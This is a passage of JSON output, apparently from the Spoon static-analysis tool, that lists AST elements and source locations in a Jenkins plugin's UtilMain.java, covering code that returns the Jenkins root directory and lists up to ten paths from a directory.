        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "Jenkins jenkins = Jenkins.getInstanceOrNull()",
        "canonical": "Jenkins jenkins = Jenkins.getInstanceOrNull()",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@261:17::261:54"
      },
      {
        "kind": "spoon.support.reflect.code.CtIfImpl",
        "source": "if (jenkins == null) {\n    return null;\n}",
        "canonical": "if (jenkins == null) {\n    return null;\n}",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@262:9::264:9"
      },
      {
        "kind": "spoon.support.reflect.code.CtReturnImpl",
        "source": "return null",
        "canonical": "return null",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@263:13::263:24"
      },
      {
        "kind": "spoon.support.reflect.code.CtReturnImpl",
        "source": "return jenkins.getRootDir()",
        "canonical": "return jenkins.getRootDir()",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@265:9::265:36"
      },
      {
        "kind": "spoon.support.reflect.code.CtInvocationImpl",
        "source": "events.clear()",
        "canonical": "events.clear()",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@268:40::268:54"
      },
      {
        "kind": "spoon.support.reflect.code.CtReturnImpl",
        "source": "return Collections.unmodifiableList(events)",
        "canonical": "return Collections.unmodifiableList(events)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@270:9::270:52"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "StringBuilder builder = new StringBuilder()",
        "canonical": "StringBuilder builder = new StringBuilder()",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@275:23::275:52"
      },
      {
        "kind": "spoon.support.reflect.code.CtInvocationImpl",
        "source": "Files.list(new File(dir).toPath()).limit(10).forEach(path -> {\n    builder.append(path);\n    builder.append(\"\\n\");\n})",
        "canonical": "Files.list(new File(dir).toPath()).limit(10).forEach(path -> {\n    builder.append(path);\n    builder.append(\"\\n\");\n})",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@276:9::279:11"
      },
      {
        "kind": "spoon.support.reflect.code.CtInvocationImpl",
        "source": "builder.append(path)",
        "canonical": "builder.append(path)",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@277:13::277:33"
      },
      {
        "kind": "spoon.support.reflect.code.CtInvocationImpl",
        "source": "builder.append(\"\\n\")",
        "canonical": "builder.append(\"\\n\")",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@278:13::278:33"
      },
      {
        "kind": "spoon.support.reflect.code.CtLocalVariableImpl",
        "source": "String result = builder.toString()",
        "canonical": "String result = builder.toString()",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@280:16::280:43"
      },
      {
        "kind": "spoon.support.reflect.code.CtReturnImpl",
        "source": "return result",
        "canonical": "return result",
        "location": "/src/plugins/pipeline-util-plugin/src/main/java/io/jenkins/plugins/UtilPlug/UtilMain.java@281:9::281:22"
      }
    ]
  }
}